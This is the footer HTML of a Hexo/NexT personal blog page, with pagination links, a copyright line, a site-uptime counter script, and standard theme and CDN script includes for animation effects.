  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">kiligwh</span>
</div>

<!-- 删除 “由 Hexo & NexT.Gemini 强力驱动” -->
<!--
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div> -->

<!-- <br /> -->
<!-- 网站运行时间的设置 -->
<span id="timeDate">载入天数...</span>
<!-- <span id="times">载入时分秒...</span> -->
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("11/17/2022 8:00:00");//此处修改你的建站时间或者网站上线时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); 
        if(String(snum).length ==1 ){snum = "0" + snum;}
        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
    }
setInterval("createtime()",250);
</script>

    </div>
  </footer>

  

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  



  <script src="/js/third-party/pace.js"></script>

  





  
  
  <script type="text/javascript"
	count="150"
	opacity: 1
	src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
  </script>
  

</body>
</html>
